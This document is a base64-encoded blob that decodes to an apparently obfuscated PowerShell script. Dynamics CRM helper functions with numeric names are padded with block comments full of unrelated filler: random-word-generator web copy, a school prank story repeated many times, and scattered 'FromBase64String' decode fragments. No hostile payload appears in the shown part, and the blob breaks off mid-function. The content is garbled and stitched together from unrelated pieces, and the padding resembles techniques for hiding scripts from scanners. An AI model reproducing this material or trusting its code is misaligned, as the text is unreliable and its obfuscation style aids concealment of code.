JZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gZigpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDEwewoKIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSggICAgICAgIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0wKV0KICAgICAgICBbaW50XSRWYWx1ZQogICAgKQogICAgJGNybU9wdGlvblNldFZhbHVlID0gW01pY3Jvc29mdC5Ycm0uU2RrLk9wdGlvblNldFZhbHVlXTo6bmV3KCkKICAgICRjcm1PcHRpb25TZXRWYWx1ZS5WYWx1ZSA9ICRWYWx1ZQogICAgJGNybU9wdGlvblNldFZhbHVlCiAgICByZXR1cm4KfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGMoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gZigpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDExewoKIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSggICAgICAgIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0wKV0KICAgICAgICBbc3RyaW5nXSRFbnRpdHlMb2dpY2FsTmFtZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSldCiAgICAgICAgW2d1aWRdJElkCiAgICApCiAgICAkY3JtRW50aXR5UmVmZXJlbmNlID0gW01pY3Jvc29mdC5Ycm0uU2RrLkVudGl0eVJlZmVyZW5jZV06Om5ldygpCiAgICAkY3JtRW50aXR5UmVmZXJlbmNlLkxvZ2ljYWxOYW1lID0gJEVudGl0eUxvZ2ljYWxOYW1lCiAgICAkY3JtRW50aXR5UmVmZXJlbmNlLklkID0gJElkCiAgICAkY3JtRW50aXR5UmVmZXJlbmNlCiAgICByZXR1cm4KfQoKIyMjIFBlcmZvcm1hbmNlIFRlc3RzICMjIwpmdW5jdGlvbiAxMnsKCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiKV1bQWxpYXMoIkNybVJlY29yZCIpXQogICAgICAgIFtQU09iamVjdF0kVmlldywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iSWQiKV1bQWxpYXMoIklkIildCiAgICAgICAgW2d1aWRdJFZpZXdJZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iTmFtZSIpXQogICAgICAgIFtzdHJpbmddJFZpZXdOYW1lLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW3N3aXRjaF0kUnVuQXNWaWV3T3duZXIsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbZ3VpZF0kUnVuQXMsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbc3dpdGNoXSRJc1VzZXJWaWV3ICAgICAgIAogICAgKQogICAgCgkkY29ubiA9IFZlcmlmeUNybUNvbm5lY3Rpb25QYXJhbSAtY29ubiAkY29ubiAtcGlwZWxpbmVWYWx1ZSAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdjb25uJykpICAgICAgICAKIAogICAgaWYoJElzVXNlclZpZXcpCiAgICB7IAoJCVdyaXRlLVZlcmJvc2UgInF1ZXJ5aW5nIHVzZXJxdWVyeSIKICAgICAgICAkbG9naWNhbE5hbWUgPSAidXNlcnF1ZXJ5IgogICAgICAgICRmaWVsZHMgPSAibmFtZSxmZXRjaHhtbCxsYXlvdXR4bWwscmV0dXJuZWR0eXBlY29kZSxvd25lcmlkIi5TcGxpdCgiLCIpOyAgICAgIAogICAgfSAKICAgIGVsc2UKICAgIHsKCQlXcml0ZS1WZXJib3NlICJxdWVyeWluZyBzYXZlZHF1ZXJ5IgogICAgICAgICRsb2dpY2FsTmFtZSA9ICJzYXZlZHF1ZXJ5IgogICAgICAgICRmaWVsZHMgPSAibmFtZSxmZXRjaHhtbCxsYXlvdXR4bWwscmV0dXJuZWR0eXBlY29kZSIuU3BsaXQoIiwiKTsKICAgIH0KICAgIHRyeQogICAgewoJCWlmKC1ub3QgJFZpZXcpCgkJewoJCQlpZigkVmlld0lkIC1uZSAkbnVsbCkKCQkJeyAgICAgICAgCgkJCSAgICAkVmlldyA9IEdldC1Dcm1SZWNvcmQgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lICRsb2dpY2FsTmFtZSAtSWQgJHZpZXdJZCAtRmllbGRzICRmaWVsZHMKCQkJfQoJCQllbHNlaWYoJHZpZXdOYW1lIC1uZSAiIikKCQkJewoJCQkgICAgJHZpZXdzID0gR2V0LUNybVJlY29yZHMgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lICRsb2dpY2FsTmFtZSAtRmlsdGVyQXR0cmlidXRlIG5hbWUgLUZpbHRlck9wZXJhdG9yIGVxIC1GaWx0ZXJWYWx1ZSAkdmlld05hbWUgLUZpZWxkcyAkZmllbGRzCgkJCSAgICBpZigkdmlld3MuQ3JtUmVjb3Jkcy5Db3VudCAtZXEgMCkgCgkJCQl7IAoJCQkJCXJldHVybiAKCQkJCX0gCgkJCQllbHNlIAoJCQkJeyAKCQ